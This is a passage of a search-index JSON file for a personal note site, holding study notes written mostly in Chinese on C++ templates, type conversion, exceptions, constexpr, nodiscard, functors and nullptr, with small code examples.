\u9700\u8981\u7684\u529f\u80fd\uff0c\u8fd9\u4e2aB\uff08\uff09\u5c31\u662f\u521b\u5efa\u65b0\u7684B\u7c7b\u5bf9\u8c61\u7684\u610f\u601d\uff0c\u5e76\u975e\u662f\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362</p> <p>\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u6c47\u603b</p> <p>\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u51fa\u7684\uff0c\u5176\u4e2dT\u53ef\u4ee5\u8868\u793a\u4efb\u4f55\u7c7b\u578b T[]\u8868\u793a\u6570\u7ec4</p> <p>\u200b\u200b</p> <p>\u9700\u8981\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u8f6c\u6362 T\u53ef\u4ee5\u8f6c\u6362\u4e3aC\u7c7b\uff0c\u9700\u8981\u505a\u4ee5\u4e0b\u4e24\u79cd\u64cd\u4f5c\u4e2d\u7684\u4e00\u79cd</p> <ol> <li>C\uff08T\uff09\u662f\u4e00\u4e2avalid constuctor call for C</li> <li>operator C() \u5728T\u4e2d\u88ab\u5b9a\u4e49</li> </ol> <p>\u7279\u522b\u5730\uff0c\u8981\u6ce8\u610f\u5982\u679c\u4e24\u79cd\u60c5\u51b5\u540c\u65f6\u5b58\u5728\u65f6\uff0c\u56e0\u4e3a\u6ca1\u6709\u4f18\u5148\u7ea7\uff0c\u4f1a\u51fa\u73b0ERROR \u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u5728\u6784\u9020\u51fd\u6570\u4e4b\u524d\u52a0\u4e00\u4e2aexplicit\u5173\u952e\u5b57\uff0c\u4fdd\u8bc1\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u518d\u662f\u81ea\u52a8\u7684\u7c7b\u578b\u8f6c\u6362 \u4f46\u662f\u6700\u597d\u4e0d\u8981\u505a\u8fd9\u6837\u7684\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\uff0c\u8fd9\u6837\u5f53\u4f60\u628a\u4e0d\u662f\u4f60\u672c\u610f\u8981\u4f20\u5165\u51fd\u6570\u7684\u5bf9\u8c61\u4f20\u5165\u65f6\u53ef\u80fd\u4f1a\u9a97\u8fc7\u7f16\u8bd1\u5668</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#template-generic-programming","title":"template \u6a21\u677f generic programming","text":"<p>\u4e3a\u4ec0\u4e48\u9700\u8981\u6a21\u7248\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u94fe\u8868\u7c7b\uff0cint\u94fe\u8868\u548cdouble\u94fe\u8868\uff0c\u5b83\u4eec\u7684\u4ee3\u7801\u662f \u53ca\u5176\u76f8\u4f3c\u7684\uff0c\u540c\u65f6\u53ea\u662f\u6210\u5458\u7684\u7c7b\u578b\u5b58\u5728\u5dee\u5f02</p> <p>\u6a21\u677f\u53ef\u4ee5\u5c06\u7c7b\u578b\u4f5c\u4e3a\u53c2\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u505afunction template and class template</p> <p>\u51fd\u6570\u6a21\u677f \u7c7b\u6a21\u677f \u6a21\u677f\u51fd\u6570 \u6a21\u677f\u7c7b \u7c7b\u6a21\u677f\u505a\u5bb9\u5668  </p> <pre><code>void swap(int &amp;x,int &amp;y){\n    int temp=x;\n    x=y;\n    y=temp;\n}\n//\u8981\u5c06\u4e0a\u8ff0\u51fd\u6570\u8f6c\u6362\u4e3a\u6a21\u677f\u51fd\u6570\ntemplate&lt;class T&gt;\nvoid swap(T&amp; x,T&amp; y){\n    T temp=x;\n    x=y;\n    y=temp;\n}\n</code></pre> <p>template\u662f\u4e00\u4e2a\u5173\u952e\u5b57\uff0cT\u662f\u6211\u4eec\u5e38\u7528\u7684\u8868\u793a\u6a21\u7248\u7684 \u5f53\u6211\u4eec\u5199\u4e86\u8fd9\u4e00\u884ctemplate\u4e4b\u540e\uff0c\u4e0b\u4e00\u884c\u51fa\u73b0\u7684\u51fd\u6570\u6216\u8005\u7c7b\u5c31\u4f1a\u53d8\u4e3a\u4e00\u79cd\u6a21\u677f</p> <p>\u51fd\u6570\u6a21\u677f\u7684\u5177\u4f53\u5b9e\u73b0</p> <p>\u8fd9\u4e00\u884ctemplate\u662f\u4e00\u4e2a\u58f0\u660e\uff0c\u5728\u7f16\u8bd1\u5668\u6536\u5230\u8fd9\u4e2a\u58f0\u660e\u4e4b\u540e\uff0c\u4f1a\u5c06swap\u7ed9\u8bb0\u4e0b\u6765 \u5f53\u5728\u540e\u9762\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u5230swap\u65f6\uff0c\u4f1a\u53bb\u8fdb\u884c\u7c7b\u578b\u7684\u5224\u65ad\uff0c\u4f8b\u5982\u9047\u5230\u4e86float\u7684swap \u90a3\u4e48\u7f16\u8bd1\u5668\u4f1a\u5e2e\u6211\u4eec\u53bb\u505a\u4e00\u4e2afloat\u7684swap\u51fa\u6765\uff0c\u8fd9\u5c31\u662f\u6a21\u677f\u771f\u6b63\u7684\u5b9a\u4e49\uff0c\u56e0\u6b64\u6211\u4eec \u7684\u5b9e\u9645\u4ee3\u7801\u6700\u540e\u662f\u4f1a\u6709\u8fd9\u4e9b\u4e2a\u91cd\u8f7d\u7684\u51fd\u6570\u7684</p> <p>\u5728\u4e0a\u8ff0\u5b9e\u73b0\u4e2d \u5982\u679c\u6211\u4eecswap\u4e00\u4e2aint double\u53d8\u91cf\uff0c\u6709\u6a21\u677f\u7684\u60c5\u51b5\u4e0b\u662f\u4e0d\u4f1a\u5e2e\u6211\u4eec\u505a \u81ea\u52a8\u7c7b\u578b\u8f6c\u6362 \u4f1a\u51fa\u73b0ERROR</p> <p>\u5b9e\u9645\u7684\u8fd0\u884c\u4e4b\u4e2d\uff0c\u9047\u5230\u4e00\u4e2a\u51fd\u6570\uff0c\u5148\u770b\u770b\u6709\u6ca1\u6709\u5b8c\u5168\u5339\u914d\u7684\u51fd\u6570\uff0c\u518d\u770b\u6709\u6ca1\u6709\u6a21\u677f\u51fd\u6570\uff0c\u6700\u540e\u8003\u8651\u662f\u5426\u53ef\u4ee5\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u4e3a\u975e\u6a21\u677f\u7684\u51fd\u6570</p> <pre><code>int mymax(int a,int b){\n    cout&lt;&lt;\"mymax\"&lt;&lt;endl;\n    if(a&gt;b){\n        return a;\n    }else{\n        return b;\n    }\n}\ntemplate&lt;class T&gt;\nint mymax(T x,T y){\n    cout&lt;&lt;\"template\"&lt;&lt;endl;\n    return 1;\n}\n\nint main(){\n    mymax(1,2.0);\n    mymax(1,1);\n    mymax(2.0,2);\n    mymax(1.0,1.0);\n}\n\u524d\u4e09\u4e2a\u8c03\u7528\u7684\u90fd\u662f\u975e\u6a21\u677f\u51fd\u6570\uff0c\u6700\u540e\u4e00\u4e2a\u4f1a\u8c03\u7528\u6a21\u677f\u51fd\u6570\n</code></pre> <p>\u4f46\u662f\u6709\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u6539\u53d8\u7684\u7c7b\u578b\u5e76\u4e0d\u5b58\u5728\u4e8e\u51fd\u6570\u7684\u53c2\u6570\u8868\u91cc\u9762\uff0c\u800c\u662f\u51fa\u73b0\u5728 \u51fd\u6570\u7684\u5185\u5bb9\u91cc\uff0c\u6b64\u65f6\u5c31\u4e0d\u80fd\u7b80\u5355\u5730\u901a\u8fc7\u51fd\u6570\u91cd\u8f7d\u6765\u5b9e\u73b0\uff0c\u56e0\u6b64\u6211\u4eec\u6709\u5176\u4ed6\u7684\u65b9\u6cd5</p> <pre><code>template&lt;class T&gt;\nvoid f(void){}\nint main(){\n    f&lt;int&gt;();\n    f&lt;double&gt;();\n}\n//\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u8c03\u7528\u6a21\u677f\u51fd\u6570\u5219\u66f4\u52a0\u5730\u6e05\u6670\uff0c&lt;&gt;\u91cc\u9762\u5373\u8868\u793a\u6211\u4eec\u9700\u8981\u7684\u6a21\u677f\u91cc\u5934\u7684T\u7684\u7c7b\u578b\n//\u610f\u601d\u5c31\u662f\u8bf4f&lt;int&gt;\u8fd9\u6837\u5199\u4e4b\u540e\uff0c\u7f16\u8bd1\u5668\u4f1a\u5e2e\u6211\u4eec\u505a\u51fa\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\u6765\n</code></pre> <p>\u7c7b\u6a21\u677f\u7684\u5177\u4f53\u5b9e\u73b0</p> <p>\u7c7b\u6a21\u677f\u4e5f\u662f\u76f8\u540c\u7684\uff0c\u4ed6\u672c\u8eab\u4e0d\u4f5c\u4e3a\u6e90\u6587\u4ef6\u4ee3\u7801\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u662f\u5f53\u6709\u4eba\u7528\u5230\u6a21\u677f\u65f6\uff0c\u4f1a\u6839\u636e\u4ed6\u7ed9\u51fa\u7684\u7c7b\u578b\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u51fa\u6765 this process we call it an instantiation</p> <p>\u4ee5\u7b80\u5355\u7684vector\u4e3a\u4f8b</p> <pre><code>template&lt;class T&gt;\nclass Vector{\npublic:\n    Vector(int);\n    ~Vector();\n    Vector(const Vector&amp;);\n    Vector&amp; operator=(const Vector&amp;);\n    T&amp; operator[](int);\nprivate:\n    T* m_elements;\n    int m_size;\n};\n//\u5bf9\u4e8e\u8fd9\u4e2a\u7c7b\u7684\u51fd\u6570\u7684\u4e66\u5199\n//\u6bcf\u4e2a\u51fd\u6570\u90fd\u5fc5\u987b\u662f\u51fd\u6570\u6a21\u677f\ntemplate&lt;class T&gt;\nVector&lt;T&gt;::Vector(int size):m_size(size){\n    m_elemnts=new T[m_size];\n}\ntemplate &lt;class T&gt;\nT&amp; Vector&lt;T&gt;::operator[](int index){\n    \u5b9e\u9645\u5185\u5bb9\n}\n//\u6b64\u65f6\u5728\u521b\u5efa\u5bf9\u8c61\u662f\nVector&lt;int&gt; myarray(100);\n</code></pre> <p>The center of template using is instantiation. However if we only create a pointer for a template class/function, it will not create any instance. When this object it points is created, the system would create the instance for us.</p> <pre><code>template&lt;typename T&gt;\nclass Test{...};\nTest&lt;int&gt;* p;\np=new Test&lt;int&gt;;//?\n</code></pre> <p>We can also use abs&lt;&gt;(1.0) instead of abs(1.0) and here our compiler will guess the type you want. It is called template argument deduction. <p>\u4e00\u4e2a\u7b80\u5355\u7684sort\u51fd\u6570\u7684\u4f8b\u5b50</p> <pre><code>template&lt;class T&gt;\nvoid sort(vector&lt;T&gt;&amp; arr){\n    const size_t last=arr.size()-1;\n    for(int i=0;i&lt;last;i++){\n        for(int j=last;i&lt;j;j--){\n            if(arr[j]&lt;arr[j-1]){\n                swap(arr[j],arr[j-1]);\n            }\n        }\n    }\n}\n//\u8fd9\u4e2a\u51fd\u6570\u7684\u5b9e\u73b0\u9700\u8981\u4e24\u4e2a\u6761\u4ef6\n//1.swap\u51fd\u6570\u65f6\u51fd\u6570\u6a21\u677f\n//2.T\u8fd9\u4e2a\u7c7b\u578b\u652f\u6301&lt;\u8fd9\u4e2a\u7b26\u53f7\u7684\u6bd4\u8f83 \u4e5f\u5373\u6709\u8fd0\u7b97\u7b26\u91cd\u8f7d\n</code></pre> <p>\u5728\u51fa\u73b0multiple template\u65f6\uff0c\u6709\u65f6\u5019\u4f1a\u51fa\u73b0\u5982\u4e0b\u60c5\u51b5 vector &gt;//&gt;&gt;\u8fd9\u4e2a\u7b26\u53f7\u5de6\u79fb\u7684\u4f4d\u8fd0\u7b97\uff0c\u56e0\u6b64\u5728\u67d0\u4e9b\u7f16\u8bd1\u5668\u4e2d\u4f1a\u8981\u6c42\u5176\u4e2d\u95f4\u5fc5\u987b\u6709\u4e00\u4e2a\u7a7a\u683c <p>\u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a\u7684 vector&amp;,int)&gt;\uff0c\u8fd9\u4e2avector\u7684\u6210\u5458\u662f\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u6307\u9488 \u8fd9\u4e9b\u51fd\u6570\u6307\u9488\u7684\u53c2\u6570\u662f\u4e00\u4e2avector of double \u7684\u5f15\u7528\u548c \u4e00\u4e2aint <p>template\u7684\u62d3\u5c55\u7528\u6cd5</p> <pre><code>template &lt;class T, int bounds=100&gt;\nclass fixedvec{\n    T element[bounds]\n}\nfixedvec&lt;int,20&gt; a;\n//\u6b64\u65f6\u8fd9\u4e2abounds\u5373\u4e3a20\n</code></pre> <p>template\u7684\u5b9e\u9645\u542b\u4e49\u662f \u8bf4\u660eT\u662f\u4e00\u79cd\u7c7b\u578b\uff0cbounds\u662f\u4e00\u4e2aint \u7136\u540e\u5982\u679c\u5728\u5b9a\u4e49\u65f6\u4e0d\u52a0\u8bf4\u660e \u5219bounds\u7b49\u4e8e100 \u7136\u540e\u5728\u4e0b\u9762\u7684\u51fd\u6570\u6216\u8005\u7c7b\u91cc\u9762\u53ef\u4ee5\u4f7f\u7528\u8fd9\u91cc\u9762\u51e0\u79cd\u58f0\u660e\uff0c\u5176\u4e2d\u8fd9\u4e2abounds\u662f\u53ef\u4ee5\u4f5c\u4e3a \u6570\u7ec4\u7684\u521d\u59cb\u5316\u7684T elements[bounds];</p> <p>\u6a21\u677f\u53ef\u4ee5\u53ef\u4ee5\u62e5\u6709\u9ed8\u8ba4\u53c2\u6570 template has default parameters</p> <pre><code>template&lt;typename T,typename B=int&gt; class Foo{...};\n// f1\u548cf2\u5b9e\u9645\u7c7b\u578b\u76f8\u540c\nFoo&lt;int,int&gt; f1;\nFoo&lt;int&gt; f2;\n</code></pre> <p>We have know that compiler will guess the your parameter type, so the default parameter of template don't need to be at the end of parameter list. (\u6a21\u677f\u7684\u9ed8\u8ba4\u53c2\u6570\u4e0d\u5fc5\u51fa\u73b0\u5728\u6700\u540e</p> <p>And if there is template function, it has default parameter and compiler guess another type, then argument deduction will be prior.</p> <pre><code>template&lt;typename T=int&gt; void func(T x){...}\nint main(){\n    double x=1.0;\n    func(x); //T is double\n}\n</code></pre> <p>\u200d</p> <p>\u200d</p> <p>template and inheritance </p> <p>\u5728\u6a21\u677f\u91cc\u51fa\u73b0\u7ee7\u627f\uff0c\u8981\u6e05\u6670\uff0c\u7ee7\u627f\u4f9d\u65e7\u662f\u7ee7\u627f\u7684\u662f\u7c7b\u800c\u4e0d\u662f\u6a21\u677f\uff0c template class Derived:public list{}; <p>\u6b64\u65f6\u8fd9\u4e2alist\u4ecd\u7136\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\uff0c\u53ea\u662f\u6709\u6a21\u677f\u800c\u5df2 <p>C++\u5982\u4f55\u5904\u7406\u591a\u6587\u4ef6\u91cc\u7684\u6a21\u677f\u4ea7\u751f\u91cd\u540d\u7684\u95ee\u9898\uff0c</p> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#some-conception-i-meet-creating-allocator","title":"some conception I meet creating allocator","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#constexpr-and-noexcept","title":"constexpr and noexcept","text":"<p>constexpr\u76ee\u7684\u5728\u4e8e\u5c06\u8fd0\u7b97\u653e\u5728\u7f16\u8bd1\u9636\u6bb5\u800c\u4e0d\u662f\u8fd0\u884c\u9636\u6bb5\uff0c\u53ef\u4ee5\u7528\u6765\u4fee\u9970\u51fd\u6570\u548c\u7ed3\u6784\u4f53</p> <p>\u5bf9\u4e8e\u4fee\u9970\u7684\u51fd\u6570\uff0c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u8981\u6c42</p> <ul> <li>\u4fee\u9970\u7684\u51fd\u6570\u53ea\u80fd\u5305\u62ecreturn \u8bed\u53e5\u3002</li> <li>\u4fee\u9970\u7684\u51fd\u6570\u53ea\u80fd\u5f15\u7528\u5168\u5c40\u4e0d\u53d8\u5e38\u91cf\u3002</li> <li>\u4fee\u9970\u7684\u51fd\u6570\u53ea\u80fd\u8c03\u7528\u5176\u4ed6constexpr\u4fee\u9970\u7684\u51fd\u6570\u3002</li> <li>\u51fd\u6570\u4e0d\u80fd\u4e3avoid \u7c7b\u578b\u548c\uff0c\u5e76\u4e14prefix operation\uff08v++\uff09\u4e0d\u5141\u8bb8\u51fa\u73b0\u3002</li> </ul> <p>noexcept \u662f\u7528\u6765\u8bf4\u660e\u4e00\u4e2a\u51fd\u6570\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u90a3\u4e48\u4ee3\u7801\u5728\u7f16\u8bd1\u65f6\u5c31\u4e0d\u4f1a\u4e3a\u8fd9\u4e2a\u51fd\u6570\u4ea7\u751f\u9519\u8bef\u4fe1\u606f\u7684\u5806\u6808</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#nodiscard","title":"nodiscard","text":"<p>\u7528[[nodiscard]]\u53bb\u6807\u8bb0\u4e00\u4e2a\u8fd4\u56de\u503c\u548c\u4e00\u4e2a\u7c7b\uff0c\u7528\u4e8e\u8bf4\u660e\u8fd9\u4e2a\u8fd4\u56de\u503c\u6216\u8005\u7c7b\u662f\u201c\u4e0d\u8be5\u88ab\u820d\u5f03\u7684\u201d\uff0c\u5f53\u540e\u7eed\u7a0b\u5e8f\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u4f46\u6ca1\u6709\u53d8\u91cf\u53bb\u63a5\u6536 \u8fd9\u4e2a\u8fd4\u56de\u503c\u7684\u65f6\u5019\uff0c\u7f16\u8bd1\u5668\u4f1a\u7ed9\u51fawarning</p> <pre><code>[[nodiscard]] int func(){return 2};\nint main(){\n    func();       //error\n    int n=func(); //right\n}\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_7","title":"\u5f02\u5e38","text":"<p>\u7a0b\u5e8f\u662f\u5426\u6b63\u786e\u5904\u7406\u8fd0\u884c\u65f6\u7684\u5404\u79cd\u95ee\u9898\uff0c\u6bd4\u5982\u8c03\u7528\u6587\u4ef6\u5904\u7406\u51fd\u6570\u7684\u65f6\u5019\u6839\u636e\u8fd4\u56de\u503c\u5224\u65ad\u662f\u5426\u6210\u529f\u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c</p> <p>exception</p> <p>\u5728\u6587\u4ef6\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u751f\u4e86\u67d0\u4e9b\u95ee\u9898\uff0c\u867d\u7136\u7a0b\u5e8f\u672c\u8eab\u4e5f\u8bb8\u65e0\u6cd5\u5904\u7406\u8fd9\u4e2a\u95ee\u9898\uff08\u6587\u4ef6\u6253\u5f00\u51fd\u6570\u65e0\u6cd5\u5904\u7406\u6587\u4ef6\u65e0\u6cd5\u6253\u5f00\u7684\u95ee\u9898\uff0c\u4f46\u662f\u5b83\u53ef\u4ee5\u544a\u8bc9\u6211\u4eec\u51fa\u9519\u4e86\uff0c\u5e76\u4e14\u963b\u6b62\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\u4e0b\u53bb\uff09\uff0c\u4f46\u662f\u8981\u5bf9\u5176\u505a\u4e00\u5b9a\u7684\u5e72\u9884\uff0c\u6307\u8df3\u51fa\u5f02\u5e38</p> <p>\u8981\u6709\u6e05\u6670\u7684\u9519\u8bef\u5904\u7406\u4ee3\u7801</p> <p>\u4ee5\u4e0b\u4e3a\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>template&lt;class T&gt;\nT&amp; vector&lt;T&gt;::operator[](int index);\n//\u6570\u7ec4\u4e0b\u6807\u4e5f\u8bb8\u4f1a\u8d8a\u754c\uff0c\u6b64\u65f6\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e2a\u5173\u952e\u5b57throw\nT&amp; vector&lt;T&gt;::operator[](int index){\n    if(index&lt;0||index&gt;=m_size){\n        throw&lt;&lt;something&gt;&gt;;\n    }\n    return m_elements[index];\n}\n</code></pre> <p>throw\u53ef\u4ee5\u629b\u51fa\u4efb\u4f55\u4e1c\u897f\uff0c\u5305\u62ec\u57fa\u7840\u6570\u636e\u7c7b\u578b\u4ee5\u53ca\u5bf9\u8c61\uff0c\u4e00\u822c\u6765\u8bf4\u4f1a\u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u5236\u4f5c\u4e00\u4e2a \u5f02\u5e38\u7684\u5bf9\u8c61</p> <pre><code>class VectorIndexError{\n};\n//\u7531\u8fd9\u4e2a\u7c7b\u53bb\u5224\u65ad\u5230\u5e95\u629b\u51fa\u4ec0\u4e48\u9519\u8bef\n//\u5b9e\u9645\u4f7f\u7528\u4e2d\nthrow VectorIndexError(index);\n//\u7528\u8fd9\u4e2aindex\u53bb\u6784\u9020\u51fa\u4e00\u4e2a\u9519\u8bef\u5bf9\u8c61\n</code></pre> <p>\u4e00\u5171\u6709\u4e09\u79cd\u5730\u65b9\u5b58\u653e\u5bf9\u8c61\uff1a\u5806\u6808\uff0c\u5806\uff0c\u5168\u5c40\u6570\u636e\u533a</p> <p>\u4e00\u65e6\u7a0b\u5e8f\u6267\u884c\u5230throw\uff0c\u4f1a\u4e00\u5c42\u4e00\u5c42\u5730\u8fd4\u56de\u4e0a\u53bb\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2atry\u53ef\u4ee5\u5904\u7406\u5b83</p> <p>try \u8bed\u53e5</p> <p>try{..}     catch ...     catch...</p> <p>try\u540e\u9762\u81f3\u5c11\u4e00\u4e2acatch catch\u7684\u5f62\u5f0f</p> <p>catch\uff08sometype v\uff09{\u5904\u7406\u64cd\u4f5c}</p> <p>\u5982\u679ccatch\u62ec\u53f7\u91cc\u9762\u5199...\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6355\u6349\u5230\u6240\u6709\u7684exception \u5bf9\u4e8e\u4e00\u4e2a\u5f02\u5e38\u800c\u8a00\uff0c\u9996\u5148\u81ea\u7136\u662f\u53bb\u627e\u6709\u65e0\u5b8c\u5168\u5339\u914d\u7684catch\uff0c\u7136\u540e\u53bb\u627e\u6709\u65e0\u7236\u7c7b\u7684\u53ef\u4ee5\u627f\u8f7d\u5b50\u7c7b\u7684catch\uff0c\u518d\u627e\u6709\u65e0...\u7684\u5339\u914d\u6240\u6709 \u4f46\u662f\u6ce8\u610f\u4e0d\u662f\u591a\u7f16\u626b\u63cf\uff0c\u800c\u662f\u4ececatch\u4ece\u4e0a\u5f80\u4e0b\uff0c\u6bcf\u4e2acatch\u6309\u7167\u8fd9\u4e09\u4e2a\u6761\u4ef6\u53bb\u68c0\u67e5\u4e00\u6b21</p> <p>\u5982\u679ccatch\u4e2d\u628a\u7236\u7c7b\u5199\u5728\u5b50\u7c7b\u524d\u9762\uff0c\u6216\u8005\u628a...\u5199\u5728\u5176\u4ed6\u524d\u9762\uff0c\u7f16\u8bd1\u4f1a\u62a5\u9519</p> <pre><code>void abc(int a):throw(aERROR,bERROR){}\n//\u8fd9\u4e2a\u542b\u4e49\u662f\u6307abc\u8fd9\u4e2a\u51fd\u6570\u6700\u591a\u53ea\u4f1a\u629b\u51fa\u8fd9\u4e24\u79cd\u5f02\u5e38\nvoid abc(int a):throw(){}\n//\u8fd9\u91cc\u542b\u4e49\u662f\u6307\u6211\u627f\u8bfa\u4e0d\u629b\u51fa\u4efb\u4f55\u5f02\u5e38\n</code></pre> <p>C++\u4e2dmalloc\u51fa\u73b0\u9519\u8bef\u662f\u629b\u51fa\u5f02\u5e38</p> <p>\u5982\u679c\u4e00\u4e2a\u7c7b\u7684\u6784\u9020\u51fd\u6570\u91cc\u629b\u51fa\u4e86\u5f02\u5e38\uff0c\u4f1a\u6bd4\u8f83\u9ebb\u70e6</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#stream","title":"stream \u6d41","text":"<p>\u7f13\u5b58\u533a\u7684\u6587\u4ef6\u5bf9\u8c61</p> <p>\u200d</p> <p>\u5728unix\u4e2d\u628a\u6240\u6709\u7684\u5916\u90e8\u8bbe\u5907\u770b\u6210\u6587\u4ef6</p> <p>C++\u7684\u7528\u4e86\u6d41 &lt;&lt; insert \u628a\u5bf9\u8c61\u63d2\u5165\u6d41\u91cc\u9762  &gt;&gt;extrator \u628a\u5bf9\u8c61\u4ece\u6d41\u91cc\u9762\u89e3\u6790\u51fa\u6765  </p> <p>\u6d41\u7684\u65b9\u5411\u4e0d\u53d8\uff0c\u4e00\u7ef4\u5355\u65b9\u5411\u7684 \u4e0ec\u76f8\u6bd4\uff0cc\u7684\u6587\u4ef6\u5904\u7406\u662f\u53ef\u4ee5\u4ece\u4efb\u610f\u5730\u65b9\u5f00\u59cb\u7684</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_8","title":"\u4eff\u51fd\u6570","text":"<p>\u4eff\u51fd\u6570\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7c7b\uff0c\u7279\u5f81\u5728\u4e8e\u91cc\u9762\u91cd\u8f7d\u4e86\uff08\uff09\u8fd9\u4e2a\u8fd0\u7b97\u7b26\uff0c\u56e0\u6b64\u5b83\u53ef\u4ee5\u4ee5\u51fd\u6570\u7684\u65b9\u5f0f\u88ab\u4f7f\u7528 \u8fd9\u4e2a\uff08\uff09\u7684\u91cd\u8f7d\u5185\u5bb9\u4fbf\u662f\u8fd9\u4e2a\u4eff\u51fd\u6570\u7684\u4e3b\u4f53</p> <p>\u4f46\u56e0\u4e3a\u5b83\u4f5c\u4e3a\u7c7b\u7684\u7f18\u6545\uff0c\u5b83\u8fd8\u53ef\u4ee5\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u6210\u5458\u53d8\u91cf\uff0c\u4f7f\u5f97\u5176\u4f7f\u7528\u66f4\u52a0\u7075\u6d3b</p> <p>\u4eff\u51fd\u6570\u7684\u4e00\u5927\u7528\u9014\u4f5c\u7528\u4e8eSTL\uff0c\u5176\u53ef\u4ee5\u5e2e\u52a9\u5b9a\u4e49\u4e00\u4e9b\u7528\u4e8e\u6bd4\u8f83\u7684\u7c7b\uff0c\u6bd4\u5982\u5728\u4f18\u5148\u961f\u5217\u91cc\u9762</p> <pre><code>struct AddOffset {\n    int offset;\n    AddOffset(int _offset): offset(_offset) {}\n    int operator()(int val) const {\n        return val + offset;\n    }\n};\n\nvoid add_offset_with_functor(int* input, int* output, int len, int offset) {\n    std::transform(input, input + len, output, AddOffset(offset));\n}\n</code></pre> <p>\u4eff\u51fd\u6570\u7279\u6b8a\u4e00\u70b9\u5728\u4e8e\uff0c\u5728\u4f7f\u7528\u4eff\u51fd\u6570\u4f8b\u5982func\uff08\uff09\u7684\u540c\u65f6\uff0c\u65e2\u662f\u5728\u4f7f\u7528\u6784\u9020\u51fd\u6570\uff0c\u4e5f\u662f\u5728\u4f7f\u7528\u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\uff1f</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_9","title":"\u521d\u59cb\u5316\u5668","text":"<p>cpp\u4e2d\u6709\u4e09\u79cd\u521d\u59cb\u5316\u5668\uff0c\u521d\u59cb\u5316\u4e0e\u8d4b\u503c\u5b58\u5728\u672c\u8d28\u533a\u522b</p> <p>\u4e00\u79cd\u662f\u7b49\u4e8e\u53f7</p> <pre><code>int i=2;//\u8fd9\u662f\u7b2c\u4e00\u79cd\u521d\u59cb\u5316\u5668\nint i(2);//\u8fd9\u662f\u7b2c\u4e8c\u79cd\u521d\u59cb\u5316\u5668\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#cppc","title":"cpp\u4e0ec\u4e0d\u517c\u5bb9\u7684\u4f8b\u5b50","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#nullptr","title":"\u7a7a\u6307\u9488nullptr","text":"<p>\u5728c\u4e2dvoid *\u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u6210\u4efb\u4f55\u7684\u6307\u9488</p> <pre><code>int *p=malloc(sizeof(int));//malloc\u7684\u8fd4\u56de\u503c\u662fvoid *\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u6210int *\n</code></pre> <p>\u5728cpp\u4e2d\u4e0d\u5141\u8bb8\u8fd9\u79cd\u9690\u5f0f\u8f6c\u6362\uff0c\u56e0\u6b64c++\u4e0d\u5141\u8bb8\u4f7f\u7528(void 